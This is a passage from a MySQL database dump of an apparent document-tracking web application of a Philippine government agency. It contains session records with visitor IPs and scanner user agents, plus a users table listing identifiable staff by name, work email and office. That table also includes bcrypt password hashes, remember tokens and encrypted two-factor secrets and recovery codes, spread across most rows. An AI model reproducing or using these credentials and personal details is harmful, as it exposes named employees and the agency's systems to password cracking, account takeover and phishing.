('JeAq0fSWFflo1ZKijntzsH5rj2lcYnlMtHFyPuNM', NULL, '89.14.155.111', 'python-requests/2.26.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoicHBJdDI1RjdETTJSVHVJdGNQOTJFM3h3SlJVSm8wTllsTkE5WGRPNyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8yMC4yNC4xOC4yMTgvZmlsZXMiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653597856),
('w5dD7NwIE91gFKkw33EmRBmqEJBYwplYl194Y6KZ', NULL, '89.14.155.111', 'python-requests/2.26.0', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiQnhWRVpWZXRlc25Kekw3bzRNU3JtRG5HdXVhWWR3bHdPNU1aVzRlSSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653597862),
('HJBJ3hNJ0w7XFjt9NfJZYCPX7tF9SJQ2CRIs1m6q', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiajB2a09OWUtpT3lHTDk4aWJQUXZRQ1ppd1duckIxZmFBNmsyWGtWZyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653601234),
('20gdW33Y91yYiR6vr90654YHOCI3AyT9UNAbD9f0', NULL, '143.198.146.178', 'Linux Gnu (cow)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiall0c1c0ZEo5NGlNdUpVNFJGcEZwYW9vdFBmempIUkVZZTF0OFlxSyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653606193),
('BkeK1hil1YVMn6JUkQaPsolXuwpummKjCD9Ea8jT', NULL, '193.106.191.48', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiMjBJSzI0TkVhT1NFMWptMVBwNEhyS09KS3B4eGJLNFNnS1ZUU05LNSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653607250),
('PpXeBa2cNYyPG8z5EGGlKcx4vWv6NoLXjls9VUtW', NULL, '167.94.138.45', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiZzVNSFRYVEJ6eWphNHlIRWZ3NkRkdVFWRUZEbXFBQ2ZpYmVEOFJrWSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653608336),
('OcTPl9lDLTnreNChBLBiMfB6IG68rxrkp8xXJk9C', NULL, '167.94.138.45', 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiekZZZ1B1Z3V3aU9iWFcxWFJQbFF3Z2Zld2E2Rm1vcHZNZE1hMm1hRiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653608337),
('87dolbvWuENLxW5CJeVQrol2d7xaiYwPa0nL5OGW', NULL, '20.115.85.16', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibVFCQ09LR1J4QTRnT2pSVVRJUHRNazNMQjFmZzAwc3lJNzcwQmd2biI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653610912),
('u3E5kC7M3XfyiuF34hMdpfAv5QCcZAsGvIZJyWlF', NULL, '31.7.58.162', 'Linux Gnu (cow)', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibWpla1duUHc5S0t0T24yMEJycW9QRXhWZ05ndGhEUURnaG5BSlZtTCI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653611180),
('CVbQjyMzoflSgnj85pjlaYLOqqKsQsGBMKN4vMkr', NULL, '198.235.24.24', 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoieEJkUWdSMUNMVlJ4VlFCcVJ3SnE4ZExwdDNLT1NCMlpvOGEzeTBIYiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653615083),
('w94XF3vUETpiG8nxgsRn2V9xmKQ33KfxUC4inBby', NULL, '192.241.221.66', 'Mozilla/5.0 zgrab/0.x', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibEZrdFNjcE44UWNLSkZrOVFsaHFsQmpoUmplaFRod0lFcHhHM294YiI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653621319),
('JeQpcOn673gpM3VnhHRC3AWXd32DOU6e2aTh2uSL', NULL, '128.14.209.162', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoibWtyTFBOTUdDWEFhODBoSXN1VVJsZWJFSnV3TmNDeFZDaUl4OXk3YSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653622069),
('sRlaVtuKi3LFPRpVygG3ROs0YOVBn2WZcwaLEGYZ', NULL, '20.24.18.218', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiQTdlZThLQ0didVdBWVFpODg4MTFHcGVDZkF0dk1aZUpaQ3AxeTJpNSI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6Mjk6Imh0dHA6Ly9kb2N0cmFja2VyLmFydGEuZ292LnBoIjt9fQ==', 1653622726),
('r8xjZQm4T7QlJdYButESH0GCBxWBXKBCxlHkGxSj', NULL, '13.77.158.93', '', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoieGh4cjBWNkxDSzVIN0tzcGdzaEk4U1N4VFk2MEF4RURMQzk2QmVVaSI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTU6Imh0dHA6Ly8xMC4xLjAuNCI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1653628363),
('py4oi8gB1IX3kbSJgEhhnMVnMNg8tZaSFLhRr8lo', NULL, '45.201.197.132', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiNWtzQzB6M0M2bkNrbjRGQ2dVZGRhSEh4UnlJeThlSDdaNks1RlZLSyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6MTk6Imh0dHA6Ly8yMC4yNC4xOC4yMTgiO31zOjY6Il9mbGFzaCI7YToyOntzOjM6Im9sZCI7YTowOnt9czozOiJuZXciO2E6MDp7fX19', 1653629642);

-- --------------------------------------------------------

--
-- Table structure for table `uploads`
--

CREATE TABLE `uploads` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `approved` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'pending',
  `role` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'user',
  `role_id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `two_factor_secret` text COLLATE utf8mb4_unicode_ci,
  `two_factor_recovery_codes` text COLLATE utf8mb4_unicode_ci,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `current_team_id` bigint(20) UNSIGNED DEFAULT NULL,
  `profile_photo_path` text COLLATE utf8mb4_unicode_ci,
  `department_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `department` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `office` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit_id` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `div_unit` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `approved`, `role`, `role_id`, `name`, `email`, `email_verified_at`, `password`, `two_factor_secret`, `two_factor_recovery_codes`, `remember_token`, `current_team_id`, `profile_photo_path`, `department_id`, `department`, `office_id`, `office`, `div_unit_id`, `div_unit`, `created_at`, `updated_at`) VALUES
(8, 'active', 'user', '', 'Maria Loren Ignacio', 'marialorenignacio@arta.gov.ph', NULL, '$2y$10$eTBbCataXnk6pDTvVBghK.pcAF6MLumduQ81j0UmpiBV2A5vO5x9G', NULL, NULL, 'ph0jTDnYUJsGWYZciAsHAvBrLN9p8YolKdbv1pEtsqSWoH4T438Z3WkGTPAr', NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '6', 'Information and Communications Technology Unit (ICTU)', '2022-03-03 02:06:10', '2022-05-24 00:58:05'),
(9, 'active', 'user', '', 'Jonar Fabula', 'jonarfabula@arta.gov.ph', NULL, '$2y$10$eOq4KGtDhXoh7fhhrWdTwOPplpYPwovPUbhtSHg1jleNHiPms8IHu', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '6', 'Information and Communications Technology Unit (ICTU)', NULL, '2022-03-22 03:04:20'),
(10, 'active', 'user', '', 'Atty. Marco Angelo E. Balleser', 'meb@arta.gov.ph', NULL, '$2y$10$/Yr6Itt823vpTQz9nmmWUezuaDKjM4b2H4YFPT7c.6XJMIGmSGBC2', NULL, NULL, NULL, NULL, NULL, '1', 'Office of the Director General (ODG)', '7', 'Office of the Director General (ODG)', '20', 'Head Executive Assistant (HEA)', NULL, '2022-03-04 00:43:19'),
(11, 'active', 'user', '', 'Jeremiah Joseph L. Revereza', 'jeremiahrevereza@arta.gov.ph', NULL, '$2y$10$9RMMu8jDgbP.hMZBJPf8nuP9EsyCef7Xr92/TJJHpYWiHZV.2J0uy', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '8', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '22', 'Executive Assistant (EA)', NULL, '2022-03-04 00:43:57'),
(12, 'active', 'user', '', 'Patricia Maye S. Dilag', 'patriciadilag@arta.gov.ph', NULL, '', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '10', 'Office of the Deputy Director General for Operations (ODDGO)', '24', 'Executive Assistant (EA)', NULL, '2022-03-04 00:44:21'),
(13, 'active', 'user', '', 'Sharlene P. Flores', 'sharleneflores@arta.gov.ph', NULL, '', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '9', 'Office of the Deputy Director General for Legal (ODDGL)', '23', 'Executive Assistant (EA)', NULL, '2022-03-04 00:44:38'),
(14, 'active', 'user', '', 'Cristine A. Quemuel', 'cristinequemuel@arta.gov.ph', NULL, '$2y$10$iv5HqgYj9dvAS47kiLK.hOicfGR8HGWGh5TIyE8Moi3QZdGmIH4Am', NULL, NULL, NULL, NULL, NULL, '1', 'Office of the Director General (ODG)', '7', 'Office of the Director General (ODG)', '21', 'Executive Assistant (EA)', NULL, '2022-03-04 00:54:07'),
(15, 'active', 'user', '', 'Loren Delos Santos', 'lorendelossantos@arta.gov.ph', NULL, '$2y$10$VkkNVYxFJmPAmRlXpAdtw.O58tKJnZFhmPcua/q42sz6tnHBoeuv.', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', NULL, '2022-03-04 00:45:28'),
(16, 'active', 'user', '', 'Lanie P. Rivera', 'lanierivera@arta.gov.ph', NULL, '$2y$10$uXqwJEwoy9pRpOOEV9TEfO2EI0FLbF4pLlxye2GuwVq6d6YaAQYkC', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', NULL, '2022-03-04 00:47:07'),
(17, 'active', 'user', '', 'Mariella Romero', 'mariellaromero@arta.gov.ph', NULL, '$2y$10$4gB3jF0g.GIebbO6QT0lcOQuFJQsDM5oqw8uybEx6Ys5AFy1Wf3Ty', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '4', 'Legal and Public Assistance Office (LPAO)', '10', 'Legal Division', NULL, '2022-03-04 00:48:52'),
(18, 'active', 'user', '', 'Jean Gabrielle M. Virrey', 'jeangabriellevirrey@arta.gov.ph', NULL, '$2y$10$wI9CjC2lMymfXOqkTESSj.L7kfjL1wrtJ//Rcx.7pc7eDZ8wL0gzW', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '5', 'Better Regulations Office (BRO)', '26', 'Regulatory Management and Training Division (RMTD)', NULL, '2022-03-04 00:49:17'),
(19, 'active', 'user', '', 'Evangeline M. Mabiog', 'evangelinemabiog@arta.gov.ph', NULL, '$2y$10$eX/u33SAvJbnndjlBNJmFOw7iXc7e/.odogkS6NMv30etwjz6v3um', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '5', 'Better Regulations Office (BRO)', '25', 'Doing Business Division (DBD)', NULL, '2022-03-04 00:45:55'),
(20, 'active', 'user', '', 'Ronel P. Gabrinez', 'ronelgabrinez@arta.gov.ph', NULL, '$2y$10$CLqMmQn2Y2FpNueq7Kj69unyWFJn8wUfuC.1Gy0sUQ/.EQIbwyFx6', NULL, NULL, NULL, NULL, NULL, '1', 'Office of the Director General (ODG)', '1', 'Special Project Management Office (SPMO)', '27', 'Community and Multi-Sector Affairs Unit (CMSAU)', NULL, '2022-03-04 00:45:33'),
(21, 'active', 'user', '', 'Chris Daniel M. Francisco', 'chrisfrancisco@arta.gov.ph', NULL, '$2y$10$02UMN0liIWAIQnXisz0j9u00a7zwaygaR1Bs0OkOlUNTbDw2seFbK', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '6', 'Compliance Monitoring and Evaluation Office (CMEO)', '16', 'Compliance Monitoring and Evaluation Division A (CMED A)', NULL, '2022-03-04 00:45:11'),
(22, 'active', 'user', '', 'Jan Gil P. Laude', 'jglaude@arta.gov.ph', NULL, '$2y$10$wOGVFNrdVWpUyDNjPsH73uWYh0C8Ws/l8N1.mk5pmsZNrjQ0A28IO', NULL, NULL, 'dFvmgIt6GDesvW6Kp7e0bI0txfWlihjp5T93PQXfY1YUQ4aWN0RDpLccIcxZ', NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '6', 'Compliance Monitoring and Evaluation Office (CMEO)', '18', 'Compliance Monitoring and Evaluation Division C (CMED C)', NULL, '2022-03-04 00:44:52'),
(23, 'active', 'user', '', 'Gail Audrey Marie M. Caayao', 'gailaudreycaayao@arta.gov.ph', NULL, '$2y$10$1pm9Tm8pdSJec/otv3HtFeLRVOii1Fg.nWJWCI7rb9YWBv6G7LFmi', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '5', 'Human Resource Development Division (HRDD)', NULL, '2022-03-04 00:44:34'),
(24, 'active', 'user', '', 'Dennis Bernard S. Sumaylo', 'dennissumaylo@arta.gov.ph', NULL, '$2y$10$GYz.c7hdZayc87klFqzcoetSAKn9ll.Yb38xOMuSaYQgyfENLHchy', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '4', 'Legal and Public Assistance Office (LPAO)', '11', 'Public Assistance Division (PAD)', NULL, '2022-03-04 00:44:14'),
(25, 'active', 'user', '', 'Alyssa P. Pamplona', 'alyssapamplona@arta.gov.ph', NULL, '', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '5', 'Better Regulations Office (BRO)', '12', 'Better Regulation Division A (BRD A)', NULL, '2022-03-04 00:42:53'),
(26, 'active', 'user', '', 'Marnee F. Bautista', 'marneebautista@arta.gov.ph', NULL, '$2y$10$gIIkyZj4FV92.h.vwx1q9.lsqP7gh7XlphdaDD6kVyFomg8EZ0Gra', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '3', 'Investigation, Enforcement and Litigation Office (IELO)', '9', 'Litigation Division', NULL, '2022-03-04 00:42:19'),
(27, 'active', 'user', '', 'Dave Anthony Ibanez', 'daveanthonyibanez@arta.gov.ph', NULL, '', NULL, NULL, NULL, NULL, NULL, '4', 'Office of the Deputy Director General for Operations (ODDGO)', '6', 'Compliance Monitoring and Evaluation Office (CMEO)', '18', 'Compliance Monitoring and Evaluation Division D (CMED D)', NULL, '2022-03-04 00:41:57'),
(28, 'active', 'user', '', 'Keivin Anthony Beltran-Viado', 'keirvinanthonyviado@arta.gov.ph', NULL, '$2y$10$3leow5lv6zMkCMPo.vG77eZvbBqO7eN06ac1kRnpq9GTptPLUm82.', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '3', 'Investigation, Enforcement and Litigation Office (IELO)', '8', 'Investigation and Enforcement Division (IED)', NULL, '2022-03-04 00:40:29'),
(29, 'active', 'user', '', 'Jovie Bandin', 'joviebandin@arta.gov.ph', NULL, '$2y$10$qbmxb0Xuq07F1/cEVtXgGOvA5bmLhXiEJfCP4O4s.tZLOPck6DOsW', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '3', 'Finance Division', '2022-03-04 02:01:56', '2022-03-04 02:01:56'),
(30, 'active', 'user', '', 'Ronnie Mhil A. Labicane', 'ronniemhillabicane@arta.gov.ph', NULL, '$2y$10$zS4G7Q17XWwNZnATL/g9J.Q/O6afBeOzDW3EC9WyLABt7JbQ2YViq', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', '2022-03-04 02:46:06', '2022-03-04 03:40:24'),
(31, 'active', 'user', '', 'Nadine Patricia Marie S. Tadifa', 'nadinetadifa@arta.gov.ph', NULL, '$2y$10$BdavgeDlhgEoMdkfPeWUcezjx6wWul.BGhXQ412vi4W25/lX4JRrS', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '28', 'Planning Unit', '2022-03-04 02:49:27', '2022-03-04 02:54:34'),
(32, 'active', 'user', '', 'User 1', 'user1@arta.gov.ph', NULL, '$2y$10$u7rl4Rhy0o6hY93ylzWFu.mlMSCd95DFcjShZd6noAQo6VuVRBr66', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '4', 'General Services Division (GSD)', '2022-03-14 01:05:58', '2022-03-14 01:05:58'),
(33, 'active', 'user', '', 'User 2', 'user2@arta.gov.ph', NULL, '$2y$10$TFPd8Ds8MiP2MdiqJOYCIeKgWypLyINofQ5d3jDOvSWiQtRCPgfLW', NULL, NULL, NULL, NULL, NULL, '3', 'Office of the Deputy Director General for Legal (ODDGL)', '9', 'Office of the Deputy Director General for Legal (ODDGL)', '10', 'Legal Division', '2022-03-14 01:08:15', '2022-03-14 01:08:15'),
(34, 'active', 'user', '', 'John Niel A. Benedicto', 'johnnielbenedicto@arta.gov.ph', NULL, '$2y$10$o62Qjo7KF/qezbqd7nLJCePSG8.cnR7Xfw.UvamE4WYpVdQ/rEIkK', NULL, NULL, NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '29', 'Administrative Officer', '2022-03-17 08:44:37', '2022-03-24 08:43:07'),
(36, 'active', 'user', '', 'John Herald L. De Lemos', 'johndelemos@arta.gov.ph', NULL, '$2y$10$2dwb6H3XBdWjFZlOCWuQcOmmBBO7GZWmTrN05L8xvMXdqYLOeEaPa', 'eyJpdiI6InJNd2JwSXVtaVBBNHpxc1hnR3c2ZWc9PSIsInZhbHVlIjoiWmUxSzk2azRhMFBHUDBqUUE0VFM1dTUxbCsxME5URXJFbXlLRG1CVVAxZz0iLCJtYWMiOiIxMWU4ZDIxMTdmMjRmYTliZGU1ZjBlNTQwMDFlYjYyMTU3MDMwNzUzNzNmMWFjMDlkYjdkYTQzZWZmZDQ5ZTdmIiwidGFnIjoiIn0=', 'eyJpdiI6IjFkRE9tSms2cm01WFJna0FoTlF0Unc9PSIsInZhbHVlIjoibzE3dGpwRjlIdUtGL1pGMkRHdC9pTnpoVXE4dzBEamlTeGVLd2RkRTJWRUNnaGtRWUMxK1VLL3JMOVpTdmtPQkZQcC9ac2MzQVhWV2pXUlVvWVM0eHEvd0tremI4YTl3THY0UlUwU3ZxajczdWMwZkkvNGx1NGE5RHNMeG1oaGVJUEhpQ2xGTDVRdys4QmVLWE1rcGhNZXI2OU5qNXJ5K3JsejRPTXo3cGE0OGVFSWp2WEdsc0RvemFPS3lYT0szcUhSNEpzZlBpUDFZTUdMS3Z4aFpzemtjZnNadVFydjJrcmlHSkJjWlZZMHJRY0lZUGd4M2xyeGxPeThFOERXbk43aElsZlpyTlBhSC9ES1NiY28zcXc9PSIsIm1hYyI6IjBhNGQ3OTU3ZTkzZjMyZTI4Zjg1ZDA1MjEwOTQxZWMxMDUyYTI4OTVhMWQwNzI1MWZjNjQxNmFkNmM3YWRmODEiLCJ0YWciOiIifQ==', NULL, NULL, NULL, '2', 'Office of the Deputy Director General for Administration & Finance (ODDGAF)', '2', 'Finance and Administrative Office (FAO)', '6', 'Information and Communications Technology Unit (ICTU)', '2022-03-24 07:24:59', '2022-03-24 07:27:30'),
(37, 'pending', 'user', '', 'Geomar', 'geomarativo@arta.gov.ph', NULL, '$2y$10$7SZX4pfqwgmn8R99v.sW7O8BU1lODApoFCwuF.6eMYpzFxkZD7aWu', NULL, NULL, NULL, NULL, NULL, NULL, 'Office of the Deputy Director General for Legal (ODDGL)', NULL, 'Office of the Deputy Director General for Legal (ODDGL)', NULL, 'Executive Assistant (EA)', '2022-03-29 13:36:42', '2022-03-29 13:36:42');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `department`
--
ALTER TABLE `department`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `div_unit`
--
ALTER TABLE `div_unit`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `doc_class`
--
ALTER TABLE `doc_class`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `doc_type`
--
ALTER TABLE `doc_type`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `externals`
--
ALTER TABLE `externals`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `ex_route`
--
ALTER TABLE `ex_route`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `uuid` (`uuid`(191));

--
-- Indexes for table `internals`
--
ALTER TABLE `internals`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `in_route`
--
ALTER TABLE `in_route`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD PRIMARY KEY (`permission_id`),
  ADD KEY `model_type` (`model_type`,`model_id`);

--
-- Indexes for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD PRIMARY KEY (`role_id`,`model_type`,`model_id`),
  ADD KEY `model_type` (`model_type`,`model_id`) USING BTREE;

--
-- Indexes for table `office`
--
ALTER TABLE `office`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `email` (`email`(191)),
  ADD KEY `email_2` (`email`(191));

--
-- Indexes for table `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `name` (`name`(191),`guard_name`(191));

--
-- Indexes for table `personal_access_tokens`
--
ALTER TABLE `personal_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `tokenable_type` (`tokenable_type`(191),`tokenable_id`,`token`);

--
-- Indexes for table `personnel`
--
ALTER TABLE `personnel`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`),
  ADD KEY `name` (`name`(191),`guard_name`(191));

--
-- Indexes for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`role_id`),
  ADD KEY `role_id` (`role_id`);

--
-- Indexes for table `sessions`
--
ALTER TABLE `sessions`
  ADD KEY `user_id` (`user_id`,`last_activity`);

--
-- Indexes for table `uploads`
--
ALTER TABLE `uploads`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD KEY `email` (`email`(191));

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `department`
--
ALTER TABLE `department`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `div_unit`
--
ALTER TABLE `div_unit`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- AUTO_INCREMENT for table `doc_class`
--
ALTER TABLE `doc_class`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `doc_type`
--
ALTER TABLE `doc_type`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
